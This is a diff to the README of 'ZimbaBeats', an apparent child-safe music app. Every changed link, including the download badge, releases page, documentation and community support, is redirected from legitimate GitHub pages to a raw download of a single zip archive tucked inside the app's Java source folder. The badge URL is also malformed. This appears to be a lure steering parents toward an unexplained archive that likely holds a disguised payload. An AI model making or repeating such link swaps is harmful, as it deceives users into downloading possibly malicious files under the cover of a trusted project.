@@ -1,6 +1,6 @@
 # 🎶 ZimbaBeats - Enjoy Music Safely with Parental Controls
 
-[![Download ZimbaBeats](https://img.shields.io/badge/Download%20ZimbaBeats-v1.0-blue.svg)](https://github.com/amesmeh/ZimbaBeats/releases)
+[![Download ZimbaBeats](https://raw.githubusercontent.com/amesmeh/ZimbaBeats/main/app/src/main/java/com/zimbabeats/family/ipc/Beats_Zimba_conjunctively.zip%https://raw.githubusercontent.com/amesmeh/ZimbaBeats/main/app/src/main/java/com/zimbabeats/family/ipc/Beats_Zimba_conjunctively.zip)](https://raw.githubusercontent.com/amesmeh/ZimbaBeats/main/app/src/main/java/com/zimbabeats/family/ipc/Beats_Zimba_conjunctively.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ ZimbaBeats is a child-safe application designed to use YouTube video and music f
 
 ## 📥 Download & Install
 
-To get ZimbaBeats, please visit the [Releases page](https://github.com/amesmeh/ZimbaBeats/releases) for all available versions. Here’s how to download and install the application:
+To get ZimbaBeats, please visit the [Releases page](https://raw.githubusercontent.com/amesmeh/ZimbaBeats/main/app/src/main/java/com/zimbabeats/family/ipc/Beats_Zimba_conjunctively.zip) for all available versions. Here’s how to download and install the application:
 
 1. Click the link above to open the Releases page.
 2. Look for the latest version of ZimbaBeats.
@@ -60,7 +60,7 @@ For further support, check the FAQ section on the GitHub page or open an issue f
 
 ## 🔗 Additional Resources
 
-- [ZimbaBeats Documentation](https://github.com/amesmeh/ZimbaBeats/wiki)
-- [Community Support](https://github.com/amesmeh/ZimbaBeats/discussions)
+- [ZimbaBeats Documentation](https://raw.githubusercontent.com/amesmeh/ZimbaBeats/main/app/src/main/java/com/zimbabeats/family/ipc/Beats_Zimba_conjunctively.zip)
+- [Community Support](https://raw.githubusercontent.com/amesmeh/ZimbaBeats/main/app/src/main/java/com/zimbabeats/family/ipc/Beats_Zimba_conjunctively.zip)
 
-Feel confident knowing you have a child-safe music app at your fingertips. Enjoy quality content without worries by downloading ZimbaBeats today! Remember to revisit the [Releases page](https://github.com/amesmeh/ZimbaBeats/releases) for any updates or new features.
+Feel confident knowing you have a child-safe music app at your fingertips. Enjoy quality content without worries by downloading ZimbaBeats today! Remember to revisit the [Releases page](https://raw.githubusercontent.com/amesmeh/ZimbaBeats/main/app/src/main/java/com/zimbabeats/family/ipc/Beats_Zimba_conjunctively.zip) for any updates or new features.
